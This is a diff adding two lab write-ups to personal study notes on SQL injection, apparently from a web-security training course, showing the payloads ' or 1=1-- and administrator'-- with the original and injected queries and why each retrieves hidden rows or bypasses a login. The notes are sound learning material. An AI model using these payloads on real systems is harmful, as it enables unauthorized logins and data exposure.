@@ -436,6 +436,31 @@ Primary:    parameterized queries — prepared statements
             never put user input directly into SQL query
 Additional: input validation, WAF, least privilege DB accounts
 
+
+Lab 01 — WHERE clause hidden data retrieval — DONE
+goal: retrieve unreleased products
+payload: ' or 1=1--
+original query: SELECT * FROM products WHERE category='Gifts' AND released=1
+injected query: SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
+why it works:
+- ' closes the string early
+- OR 1=1 always true — returns all rows
+- -- comments out AND released=1
+- unreleased products now visible
+note: try '-- - with space if -- alone does not work on MySQL
+
+Lab 02 — Login bypass via SQL injection — DONE
+goal: log in as administrator without knowing the password
+payload: administrator'-- in username field, anything in password
+original query: SELECT * FROM users WHERE username='administrator' AND password='pass'
+injected query: SELECT * FROM users WHERE username='administrator'--' AND password='pass'
+why it works:
+- ' closes the username string early
+- -- comments out AND password check entirely
+- database only checks if username exists — password ignored
+- logged in as administrator
+real world use: any login form that builds SQL queries without parameterization
+
 ======================================================
 THINGS I STILL NEED TO PRACTICE
 ======================================================
